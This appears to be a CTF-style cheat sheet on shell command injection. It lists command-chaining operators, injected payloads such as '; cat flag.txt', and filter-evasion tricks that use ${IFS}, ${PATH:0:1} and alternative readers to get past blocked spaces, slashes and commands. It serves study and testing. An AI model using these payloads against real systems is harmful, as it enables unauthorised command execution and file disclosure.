# Command Injection

## 1. General Case (No Restrictions)

When user input is passed directly into a shell command, we can inject extra commands.

The input is interpreted as `bash -c "<input>"` 

### Useful operators

- `;` → run next command
- `&&` → run next if previous succeeds
- `||` → run next if previous fails
- `|` → pipe output

### Examples

```bash
; ls -al
; cat flag.txt

```

---

## 2. Restricted Case (Characters/Commands Blocked)

### Whitespace blocked

Use Internal Field Separator (IFS):

```bash
ls${IFS}-al

```

### Slash `/` blocked

Reconstruct `/` from environment variables:

```bash
${PATH}  #gives /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
${PATH:0:1}   # gives "/"
ls${IFS}${PATH:0:1}

```

### `cat` blocked

Use alternatives:

```bash
head${IFS}${PATH:0:1}flag.txt
tail${IFS}${PATH:0:1}flag.txt
more${IFS}${PATH:0:1}flag.txt

```

### `cd` blocked

- Work directly with absolute/relative paths.
- No need to change directory if you can reference the file path.

---

## 3. Example Exploit Payloads

```bash
#can also use
;{ls,..,${PATH:0:1}}
```

```bash
;ls${IFS}..${IFS}${PATH:0:1}
;ls${IFS}-al${IFS}${PATH:0:1}
;head${IFS}${PATH:0:1}flag.txt

```

---
